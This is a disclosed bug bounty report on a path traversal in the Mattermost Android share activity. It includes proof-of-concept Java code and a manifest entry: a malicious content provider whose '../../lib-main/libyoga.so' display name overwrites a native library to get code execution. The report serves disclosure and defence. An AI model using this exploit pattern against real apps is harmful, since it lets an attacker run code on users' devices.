# Persistant Arbitrary code execution in mattermost android

## Report Details
- **Report ID**: 1115864
- **URL**: https://hackerone.com/reports/1115864
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-03-03T15:12:39.784Z
- **Disclosed**: 2021-06-03T10:40:12.940Z

## Reporter
- **Username**: hulkvision_
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mattermost

## Vulnerability Information
## Summary:
Activity `com.mattermost.share.ShareActivity` is is exported and is designed to allow file sharing from third party application to mattermost android app.
```
 <activity android:theme="@style/AppTheme" android:label="@string/app_name" android:name="com.mattermost.share.ShareActivity" android:taskAffinity="com.mattermost.share" android:launchMode="singleInstance" android:screenOrientation="portrait" android:configChanges="keyboard|keyboardHidden|orientation|screenSize">
            <intent-filter>
                <action android:name="android.intent.action.SEND"/>
                <action android:name="android.intent.action.SEND_MULTIPLE"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:mimeType="*/*"/>
            </intent-filter>
        </activity>
```
I have found path tansversal vulnerability at `com.mattermost.share.RealPathUtil.java`  file 
```
public static String getPathFromSavingTempFile(Context context, final Uri uri) {
             int nameIndex = returnCursor.getColumnIndex(OpenableColumns.DISPLAY_NAME); //get file name here 
            returnCursor.moveToFirst();
            fileName = returnCursor.getString(nameIndex); // "filename=../../lib-main/libyoga.so"
        } catch (Exception e) {
            // just continue to get the filename with the last segment of the path
       }
             String mimeType = getMimeType(uri.getPath());
            tmpFile = new File(cacheDir, fileName);
            tmpFile.createNewFile();  //path transversal here
            ParcelFileDescriptor pfd = context.getContentResolver().openFileDescriptor(uri, "r"); 
            //.../
```
It receives  the value of _display_name from the provider and saved the file with this name, leading to path-traversal.
## Steps To Reproduce:
  1. Install the POC app and open it. F1216351

  On the next launch of the app the malicious code will be executed.In this poc the app will crash on next launch because i was too lazy and  to create a modified version of `libyoga.so`

### POC 
In `MainActivity.java`
```
        Intent intent = new Intent(Intent.ACTION_SEND);
        intent.setClassName("com.mattermost.rn", "com.mattermost.share.ShareActivity");
        intent.putExtra("android.intent.extra.STREAM",Uri.parse("content://com.example.android.pocok/?path=/data/data/com.example.android.pocok/libevil-lib.so&name=../../lib-main/libyoga.so"));
        intent.setType("application/*");
        startActivity(intent);

```
In `EvilContentProvider.java`
```
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
    MatrixCursor matrixCursor = new MatrixCursor(new String[]{"_display_name"});
    matrixCursor.addRow(new Object[]{uri.getQueryParameter("name")});
    return matrixCursor;
}

public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    return ParcelFileDescriptor.open(new File(uri.getQueryParameter("path")), ParcelFileDescriptor.MODE_READ_ONLY);
}
```
In `AndroidManifest.xml`
```
<provider android:name=".EvilContentProvider" android:authorities="com.example.android.pocok" android:enabled="true" android:exported="true" />
```

## Impact

Attacker can inject malicious library file in the application which will lead to arbitrary code execution in the app.

## Attachments
- app-release.apk
